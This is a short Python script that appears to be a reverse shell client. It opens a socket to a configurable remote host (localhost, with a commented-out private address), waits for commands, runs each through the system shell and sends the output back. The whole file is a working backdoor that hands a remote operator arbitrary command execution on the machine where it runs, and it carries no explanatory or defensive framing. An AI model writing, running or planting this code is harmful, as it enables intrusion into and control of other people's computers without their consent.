import socket
import subprocess

REMOTE_HOST = '127.0.0.1' # '192.168.43.82'
REMOTE_PORT = 8081 # 2222
client = socket.socket()
print("+ Initiating Connection")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("+ Connected to server")

# RELIABLE SEND
def send(data):
    try:
        data = data.encode()
    except AttributeError:
        pass
    client.send(data)

# RELIABLE RECIEVE
def recv():
    output = client.recv(8417)
    output = output.decode()
    return output

while True:
    print("[-] Awaiting commands...")
    command = recv()
    print(command)
    proc = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    print("[-] Sending response...")
    result = proc.stdout.read()
    print(result)
    send(result)
